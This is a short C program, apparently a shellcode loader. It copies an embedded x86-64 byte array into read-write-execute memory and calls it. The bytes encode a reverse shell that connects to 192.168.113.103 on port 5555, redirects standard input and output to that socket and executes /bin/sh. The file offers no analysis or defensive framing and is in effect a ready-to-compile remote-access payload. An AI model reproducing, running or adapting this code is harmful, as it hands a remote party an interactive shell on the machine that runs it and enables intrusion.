#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int main() {
  unsigned char shellcode[] =
      "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
      "\x48\xb9\x02\x00\x15\xb3\xc0\xa8\x71\x67\x51\x48\x89\xe6"
      "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
      "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
      "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
      "\x89\xe6\x0f\x05";

  size_t size = sizeof(shellcode);

  // Allocate memory with RWX permissions
  void *exec_mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANON | MAP_PRIVATE, -1, 0);
  if (exec_mem == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

  // Copy shellcode into exec_mem
  memcpy(exec_mem, shellcode, size);

  // Execute it
  ((void (*)())exec_mem)();

  return 0;
}
